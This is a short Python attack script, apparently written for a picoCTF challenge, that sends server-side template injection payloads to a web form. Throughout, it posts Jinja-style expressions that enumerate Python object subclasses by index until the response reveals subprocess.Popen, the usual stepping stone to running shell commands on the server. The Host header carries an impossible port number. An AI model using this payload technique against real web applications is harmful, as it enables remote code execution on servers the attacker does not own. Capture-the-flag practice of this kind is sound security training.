import requests
from urllib.parse import quote

TARGET = "http://pico_pico"
HEADERS = {
    "Host": "thanks.picoctf.net:2983784",
    "Origin": "http://pico_pico",
    "Referer": "http://pico_pico",
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
}

def generate_payload(index):
    payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{index}] }}}}"
    return f"content={quote(payload)}"

def send_payload(index):
    data = generate_payload(index)
    resp = requests.post(TARGET, data=data, headers=HEADERS)
    return resp.text

def main():
    print("[*] Scanning for subprocess.Popen...")
    for i in range(100, 400): 
        print(f"[*] Trying index {i}...", end="\r")
        body = send_payload(i)
        if "subprocess.Popen" in body:
            print(f"\n[✅] Found subprocess.Popen at index {i}")
            print("Sample response:\n", body)
            break
    else:
        print("\n[❌] subprocess.Popen not found in this index range.")

if __name__ == "__main__":
    main()
